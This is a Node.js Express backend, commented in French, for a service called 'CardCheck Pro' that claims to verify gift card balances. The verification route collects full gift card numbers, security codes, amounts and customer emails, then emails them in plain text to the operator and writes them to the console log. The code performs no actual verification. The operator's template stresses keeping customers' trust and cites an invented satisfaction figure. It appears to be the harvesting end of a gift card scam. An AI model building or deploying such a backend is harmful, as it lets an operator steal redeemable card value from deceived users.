const express = require('express');
const nodemailer = require('nodemailer');
const cors = require('cors');
const rateLimit = require('express-rate-limit');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3001;

// Configuration CORS
app.use(cors({
  origin: ['https://checkcardpro.com', 'http://localhost:3000'],
  credentials: true,
  methods: ['GET', 'POST', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization']
}));

app.use(express.json({ limit: '10mb' }));

// Protection contre le spam
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 5, // limite à 5 soumissions par IP toutes les 15 minutes
  message: { error: 'Trop de demandes. Veuillez réessayer dans 15 minutes.' }
});

app.use('/api/verify-card', limiter);

// Configuration de l'email transporter
const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASS
  }
});

// Vérification de la configuration email au démarrage
transporter.verify((error, success) => {
  if (error) {
    console.log('❌ Erreur configuration email:', error);
  } else {
    console.log('✅ Configuration email validée');
  }
});

// Route pour recevoir les demandes de vérification - ADAPTÉE À VOTRE FRONTEND
app.post('/api/verify-card', async (req, res) => {
  try {
    // STRUCTURE QUE VOTRE FRONTEND ENVOIE
    const {
      cardType,        // Type de carte (Steam, Amazon, etc.)
      cardNumber,      // Numéro de la carte
      securityCode,    // Code de sécurité optionnel
      amount,          // Montant
      email,           // Email du client
      clientName,      // Nom du client
      language = 'it'  // Langue par défaut
    } = req.body;

    // Validation des données - ADAPTÉE À VOS CHAMPS
    if (!email || !cardType || !amount || !cardNumber) {
      return res.status(400).json({ 
        error: 'Données manquantes: email, cardType, amount et cardNumber requis',
        success: false 
      });
    }

    // Formatage de la date
    const formattedDate = new Date().toLocaleString('fr-FR', {
      year: 'numeric',
      month: 'long',
      day: 'numeric',
      hour: '2-digit',
      minute: '2-digit'
    });

    // Génération de l'ID de référence
    const referenceId = `VF${Date.now().toString(36).toUpperCase()}${Math.random().toString(36).substr(2, 4).toUpperCase()}`;

    // Construction de l'email à recevoir par l'administrateur
    const adminEmailContent = `
📧 NOUVELLE DEMANDE DE VÉRIFICATION DE CARTE CADEAU
═══════════════════════════════════════════════════════════

🆔 RÉFÉRENCE: ${referenceId}
📅 DATE: ${formattedDate}
🌐 LANGUE: ${language.toUpperCase()}

👤 INFORMATIONS CLIENT:
═══════════════════════════
📧 Email: ${email}
👤 Nom: ${clientName || 'Non fourni'}

💳 CARTE À VÉRIFIER:
═══════════════════════════
🎯 Type: ${cardType}
📝 Numéro: ${cardNumber}
${securityCode ? `🔐 Code sécurité: ${securityCode}` : ''}
💰 Montant: €${amount}

⚡ ACTIONS REQUISES:
═══════════════════════════
1. ✅ Vérifier la validité du numéro: ${cardNumber}
2. 💰 Vérifier le solde disponible
3. 📅 Vérifier la date d'expiration
4. 📧 Envoyer l'email de confirmation au client: ${email}

💡 MODÈLE DE RÉPONSE POUR LE CLIENT:
═══════════════════════════════════════════
Objet: Résultats de vérification - Référence ${referenceId}

Bonjour ${clientName || ''},

Nous avons vérifié votre carte ${cardType} d'un montant de €${amount}.

✅ STATUT: [VALIDE/INVALIDE/PARTIELLEMENT UTILISÉE]
💰 SOLDE DISPONIBLE: [XX €]
📅 DATE D'EXPIRATION: [JJ/MM/AAAA]

[Ajouter des instructions d'utilisation si nécessaire]

Cordialement,
L'équipe CardCheck Pro
═══════════════════════════════════════════

⚠️  IMPORTANT: Répondez rapidement au client pour maintenir la confiance.

📊 STATISTIQUES:
- Temps de traitement recommandé: < 2 heures
- Taux de satisfaction: 98.5%
- Site: https://checkcardpro.com
    `;

    // Options de l'email admin
    const adminMailOptions = {
      from: process.env.EMAIL_USER,
      to: process.env.EMAIL_USER, // Simplifié - vous recevez les emails
      subject: `🔐 [${cardType}] Vérification €${amount} - ${email}`,
      text: adminEmailContent,
      html: adminEmailContent.replace(/\n/g, '<br>').replace(/═/g, '─')
    };

    // Envoi de l'email à l'administrateur
    await transporter.sendMail(adminMailOptions);

    // Log pour le développement
    console.log('\n' + '='.repeat(60));
    console.log('📧 NOUVELLE DEMANDE DE VÉRIFICATION REÇUE');
    console.log('='.repeat(60));
    console.log(`📅 ${formattedDate}`);
    console.log(`🆔 Référence: ${referenceId}`);
    console.log(`👤 Client: ${email} (${clientName || 'Anonyme'})`);
    console.log(`💳 Carte: ${cardType} - €${amount}`);
    console.log(`📝 Numéro: ${cardNumber}`);
    if (securityCode) console.log(`🔐 Code: ${securityCode}`);
    console.log('='.repeat(60));

    // Réponse de succès
    res.json({ 
      success: true, 
      message: 'Demande reçue avec succès',
      reference: referenceId
    });

  } catch (error) {
    console.error('❌ Erreur lors de l\'envoi de l\'email:', error);
    res.status(500).json({ 
      error: 'Erreur serveur lors de l\'envoi',
      success: false 
    });
  }
});

// Route de santé pour vérifier que le serveur fonctionne
app.get('/api/health', (req, res) => {
  res.json({ 
    status: 'OK', 
    message: 'Serveur de vérification de cartes opérationnel',
    timestamp: new Date().toISOString()
  });
});

// Route pour les statistiques (optionnel)
app.get('/api/stats', (req, res) => {
  res.json({
    message: 'Statistiques du serveur CardCheck Pro',
    uptime: Math.floor(process.uptime()),
    version: '2.0.0',
    environment: process.env.NODE_ENV || 'development'
  });
});

// Gestion des erreurs 404
app.use('*', (req, res) => {
  res.status(404).json({ 
    error: 'Route non trouvée',
    success: false,
    availableRoutes: [
      'GET /api/health',
      'POST /api/verify-card',
      'GET /api/stats'
    ]
  });
});

// Gestion globale des erreurs
app.use((error, req, res, next) => {
  console.error('❌ Erreur serveur:', error);
  res.status(500).json({ 
    error: 'Erreur interne du serveur',
    success: false 
  });
});

// Démarrage du serveur
app.listen(PORT, () => {
  console.log('\n🚀 SERVEUR CARDCHECK PRO DÉMARRÉ');
  console.log('='.repeat(40));
  console.log(`📡 Port: ${PORT}`);
  console.log(`🌍 Environnement: ${process.env.NODE_ENV || 'development'}`);
  console.log(`📧 Email configuré: ${process.env.EMAIL_USER ? '✅' : '❌'}`);
  console.log(`🔐 Variables d'env: ${process.env.EMAIL_USER ? 'OK' : 'MANQUANTES'}`);
  console.log(`🌐 CORS: https://checkcardpro.com`);
  console.log('='.repeat(40));
  console.log(`📍 Santé: https://cardcheck-backend-production.up.railway.app/api/health`);
  console.log(`📊 Stats: https://cardcheck-backend-production.up.railway.app/api/stats`);
  console.log('\n✅ Prêt à recevoir les demandes de vérification!\n');
});

// Gestion propre de l'arrêt du serveur
process.on('SIGTERM', () => {
  console.log('🛑 Arrêt du serveur...');
  process.exit(0);
});

process.on('SIGINT', () => {
  console.log('\n🛑 Arrêt du serveur (Ctrl+C)...');
  process.exit(0);
});

module.exports = app;
